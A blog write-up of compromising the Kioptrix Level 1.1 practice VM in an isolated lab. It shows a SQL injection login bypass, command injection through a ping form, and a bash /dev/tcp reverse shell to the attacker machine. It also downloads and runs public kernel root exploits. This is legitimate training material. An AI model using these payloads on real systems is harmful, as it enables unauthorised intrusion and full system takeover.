---
layout: post
title: Vulnhub Kioptrix 2
---

## Vulnhub: Kioptrix: Level 1.1 (#2)

This is my first writeup of a Vulnhub VM, so let's see how this goes...

This writeup is for the Kioptrix: Level 1.1 (#2) found [here](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/).

The VM was run using VMWare and the attacking machine was a Kali Linux VM running in Virtualbox, both in host-only networking mode.

## Recon and Enumeration
I used netdiscover to find the IP of the box.
```
root@kali:~# netdiscover
```
![netdiscover output]({{ site.baseurl }}/images/KioptrixLevel1_1/netdiscover.png "netdiscover output")

Because I knew that the VM was running in VMWare, I chose the VMWare IP, 192.168.56.106

I then ran `nmap` to find open ports with services running on them.

```
root@kali:~# nmap 192.168.56.106
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-20 13:18 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.106
Host is up (0.0015s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
3306/tcp open  mysql
MAC Address: 00:0C:29:51:2F:3D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```

I noticed that there may be an http server running on the box, so I went to the IP address in a web browser and was presented with a logon page.

## Vulnerability Discovery and Exploitation

![Logon page]({{ site.baseurl }}/images/KioptrixLevel1_1/logon.png "Logon page")

I tested a few basic username and password combinations, but it didn't seem to do anything. I ran OWASP ZAP to find any potential vulnerabilities or hidden pages. Using an automated scan, ZAP detected a possible SQL injection vulnerability on the logon page.

![ZAP Results]({{ site.baseurl }}/images/KioptrixLevel1_1/zap.png "ZAP Results")

I plugged the attack used (`ZAP' OR '1'='1' --`) into the username field and was presented with a form to ping a machine on the network. I immanently suspected there to be a bash injection vulnerability, but I plugged in an IP to make sure.

This brought me to a page containing the output to the ping command.

![ping results]({{ site.baseurl }}/images/KioptrixLevel1_1/ping.png "ping Results")

I ran `; ls` to make sure that I could inject a command and was presented with a directory listing. Next, I injected a reverse shell by first opening a netcat listener on my Kali VM and then putting the shell code into the form.

```
root@kali:~# nc -nvlp 1234
```

```
; bash -i >& /dev/tcp/192.168.56.101/1234 0>&1
```

This presented me with a shell on my Kali VM.

![Reverse Shell]({{ site.baseurl }}/images/KioptrixLevel1_1/shell.png "Reverse Shell")

## Privilege Escalation

I first check the user that I am.

```
bash-3.00$ whoami
apache
```

I look around a bit to find possible things to exploit, but I can't find anything obvious.

Next, I check the kernel version to see if there are any exploits available.

```
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
```

I found that the box was vulnerable to ['ip_append_data()' Ring0 Privilege Escalation](https://www.exploit-db.com/exploits/9542).

Because neither box was connected to the internet, I used a shared folder on my Kali VM to move the exploit to it. I then used the python SimpleHTTPServer to send the file to the box.

```
root@kali:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

I used `wget` on the box to retrieve the file from my Kali VM.

```
bash-3.00$ cd /tmp
bash-3.00$ wget 192.168.56.101/9542.c
--10:41:56--  http://192.168.56.101/9542.c
           => `9542.c'
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,643 (2.6K) [text/plain]

    0K ..                                                    100%    5.65 MB/s

10:41:56 (5.65 MB/s) - `9542.c' saved [2643/2643]
```

I then compiled it according to the instructions and ran it.

```
bash-3.00$ gcc -o 9542 9542.c
bash-3.00$ ./9542
[-] exploit failed, try again
```

This unfortunately didn't work. I looked at the source code to figure out why, but couldn't figure it out as this error is supposed to happen when the uid did not change with the exploit.

I uploaded [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py) and ran it to find other potential vulnerabilities with the box.

```
bash-3.00$ python linuxprivchecker.py
...
[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...

    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!

    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system
    - 2.6 UDEV < 141 Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8572 || Language=c
    - 2.6 UDEV Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8478 || Language=c
    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c

    The following exploits are applicable to this kernel version and should be investigated as well
    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c
    - 2.x sock_sendpage() Local Root Exploit 2 || http://www.exploit-db.com/exploits/9436 || Language=c
    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c
    - 2.4/2.6 sock_sendpage() ring0 Root Exploit (simple ver) || http://www.exploit-db.com/exploits/9479 || Language=c
    - 2.6 UDEV < 141 Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8572 || Language=c
    - 2.4/2.6 sock_sendpage() Local Root Exploit [2] || http://www.exploit-db.com/exploits/9598 || Language=c
    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c
    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c
    - 2.6.x ptrace_attach Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8673 || Language=c
    - 2.x sock_sendpage() Local Ring0 Root Exploit || http://www.exploit-db.com/exploits/9435 || Language=c
    - 2.4/2.6 bluez Local Root Privilege Escalation Exploit (update) || http://www.exploit-db.com/exploits/926 || Language=c
    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c
    - 2.4/2.6 sock_sendpage() Local Root Exploit (ppc) || http://www.exploit-db.com/exploits/9545 || Language=c
    - 2.6 UDEV Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8478 || Language=c
    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby**
    - 2.4/2.6 sock_sendpage() Local Root Exploit [3] || http://www.exploit-db.com/exploits/9641 || Language=c
    - 2.4.x / 2.6.x uselib() Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/895 || Language=c

Finished
=================================================================================================
```

I tested the [2.6 UDEV < 141 Local Privilege Escalation Exploit](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py) using the same methodology as above, but it didn't work either. I went down to the [2.4/2.6 sock_sendpage() Local Root Exploit (ppc)](http://www.exploit-db.com/exploits/9545), once again with the same methodology
and this time it worked.

![Root]({{ site.baseurl }}/images/KioptrixLevel1_1/root.png "Root")

